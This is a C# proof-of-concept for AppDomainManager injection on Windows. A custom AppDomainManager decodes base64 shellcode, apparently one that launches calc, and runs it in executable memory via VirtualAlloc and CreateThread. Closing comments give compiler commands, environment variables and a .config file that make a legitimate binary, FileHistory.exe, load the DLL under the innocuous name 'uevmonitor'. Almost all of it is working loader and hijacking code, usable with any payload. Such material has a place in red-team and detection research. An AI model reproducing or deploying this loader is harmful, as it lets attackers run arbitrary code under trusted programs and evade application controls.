using System;
using System.EnterpriseServices;
using System.Runtime.InteropServices;


public sealed class MyAppDomainManager : AppDomainManager
{
  
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
		//Set Break here, Dump Stack. You should be in System.AppDomain.CreateAppDomainManager();
		
		System.Windows.Forms.MessageBox.Show("AppDomain - KaBoomBeacon!");
		
		// You have more control here than I am demonstrating. For example, you can set ApplicationBase, 
		// Or you can Override the Assembly Resolver, etc...
		bool res = ClassExample.Execute();
		
        return;
    }
}

public class ClassExample 
{         
	//private static UInt32 MEM_COMMIT = 0x1000;          
	//private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
	
	[DllImport("kernel32")]
	private static extern IntPtr VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
	
	[DllImport("kernel32")]
	private static extern IntPtr CreateThread(            
	UInt32 lpThreadAttributes,
	UInt32 dwStackSize,
	IntPtr lpStartAddress,
	IntPtr param,
	UInt32 dwCreationFlags,
	ref UInt32 lpThreadId           
	);
	[DllImport("kernel32")]
	private static extern UInt32 WaitForSingleObject(           
	IntPtr hHandle,
	UInt32 dwMilliseconds
	);          
	public static bool Execute()
	{

	  byte[] installercode = System.Convert.FromBase64String("/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu+AdKgpBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYwA=");
	  
	  IntPtr funcAddr = VirtualAlloc(0, (UInt32)installercode.Length, 0x1000, 0x40);
	  Marshal.Copy(installercode, 0, (IntPtr)(funcAddr), installercode.Length);
	  IntPtr hThread = IntPtr.Zero;
	  UInt32 threadId = 0;
	  IntPtr pinfo = IntPtr.Zero;
	  hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
	  WaitForSingleObject(hThread, 0xFFFFFFFF);
	  return true;
	} 
}     

/*

C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:uevmonitor.dll type.cs
set APPDOMAIN_MANAGER_ASM=uevmonitor, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
set APPDOMAIN_MANAGER_TYPE=MyAppDomainManager
set COMPLUS_Version=v4.0.30319

Or Config File

// Copy FileHistory.exe to C:\Tools\FileHistory.exe
// Copy Config Below to C:\Tools\FileHistory.exe.config


<configuration>
   <runtime>
      <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
         <probing privatePath="C:\Tools"/>
      </assemblyBinding> 
	  <appDomainManagerAssembly value="uevmonitor, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null" />  
	  <appDomainManagerType value="MyAppDomainManager" />  
   </runtime>
</configuration>




*/

